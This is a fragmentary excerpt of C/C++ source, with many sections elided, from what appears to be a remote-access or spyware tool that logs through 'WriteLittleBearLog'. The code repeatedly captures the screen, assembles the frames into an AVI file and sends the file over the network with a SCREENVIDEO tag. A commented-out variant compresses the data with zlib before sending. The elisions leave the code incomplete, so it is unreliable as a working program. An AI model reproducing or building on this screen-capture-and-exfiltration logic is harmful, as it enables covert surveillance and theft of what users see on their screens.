...
// 			if (iRet == Z_OK)
// 			{
// 				iRet = IndependentNetWork_SendMessage(lpZlibBuf,lZlibBufLen,SCREENVIDEO,szAviName);
// 			}
// 			delete []lpZlibBuf;
// 		}
		iRet = IndependentNetWork_SendMessage(lpBuf,dwFileSize,SCREENVIDEO,szAviName);
	}
...
{ 
	...
	try
	{
		while(TRUE)
		{
			...
			if (iParam)
			{
				//WriteLittleBearLog("screen is sleeping\r\n");
				lpSleep(iTimeDelay);
				continue;
			}
			...
			{
				WriteLittleBearLog("GetScreenVideo GetEncoderClsid error\r\n");
				lpSleep(iTimeDelay);
				continue;
			}
			...
			{  
				if ( *lpJpg == 'B' && *(lpJpg + 1) == 'M' )
				{
					...
					{
						WriteLittleBearLog("GetScreenVideo bmpInfoHdr error\r\n");
						goto VideoEnd;
					}
					...
					if(iFrameCnt ==0 )
					{
						...
						int iRet = ModifyModuleFileName(szAviName,strFileName);
						hResult = lpAVIFileOpenA(&pAviFile,szAviName,OF_WRITE | OF_CREATE |OF_READ,NULL);
						if (hResult != S_OK)
						{
							WriteLittleBearLog("GetScreenVideo AVIFileOpenA error\r\n");
						...
						if (hResult != S_OK)
						{
							WriteLittleBearLog("GetScreenVideo AVIFileCreateStreamA error\r\n");
							goto ScreenVideoErrorInAviStreamInit;
						}
...
ScreenVideoErrorInAviStreamInit:
	...
	{
		WriteLittleBearLog("GetScreenVideo exception\r\n");
		return FALSE;
	}
}
//screenshot end
